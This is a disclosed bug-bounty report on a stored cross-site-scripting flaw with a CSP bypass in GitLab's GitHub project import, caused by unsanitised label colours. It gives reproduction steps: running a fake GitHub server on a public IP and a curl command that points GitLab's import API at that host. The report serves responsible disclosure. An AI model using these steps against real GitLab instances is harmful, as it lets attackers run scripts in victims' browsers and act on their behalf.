# Stored-XSS with CSP-bypass via labels' color

## Report Details
- **Report ID**: 1665658
- **URL**: https://hackerone.com/reports/1665658
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-08-10T15:47:55.453Z
- **Disclosed**: 2023-02-19T22:44:01.783Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS. 


# Step to reproduce

To reproduce, we need the following prerequisite: 

- Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server
- A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.
- I created the dummy server using nodejs, so you need to have also nodejs on the machine
- A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.


# Step 1: run the dummy server

- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

# Step 2: trigger Gitlab import

- Open a new terminal, then run the following command in which:

   + `YOUR_IP` and `YOUR_PORT` by the values in the previous step
   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:80"
}'
```

After finishing, you can view the list of the labels of the imported project. You should see an popup created by this js `alert(document.domain)`

An example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels


# Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments
- dummy-server.tar.gz
